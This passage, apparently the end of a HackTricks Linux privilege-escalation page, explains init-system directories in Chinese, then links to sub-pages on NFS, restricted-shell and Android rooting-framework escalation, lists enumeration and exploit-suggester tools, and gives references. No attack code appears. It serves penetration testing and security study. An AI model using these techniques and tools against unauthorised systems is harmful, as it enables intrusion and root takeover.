目录 `/etc/init.d` 存放用于 System V init (SysVinit) 的 **脚本**，这是 **经典的 Linux 服务管理系统**。其中包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或通过位于 `/etc/rc?.d/` 的符号链接来触发。在 Redhat 系统中，另一条常见路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，这是由 Ubuntu 引入的较新的 **service management** 方式，使用配置文件来管理服务。尽管很多系统已迁移到 Upstart，但由于 Upstart 中具有兼容层，SysVinit 脚本仍会与 Upstart 配置一起被使用。

**systemd** 是一种现代的初始化与服务管理器，提供了按需启动守护进程、自动挂载管理以及系统状态快照等高级功能。它将文件组织为分发包使用的 `/usr/lib/systemd/`，以及供管理员修改的 `/etc/systemd/system/`，从而简化了系统管理。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
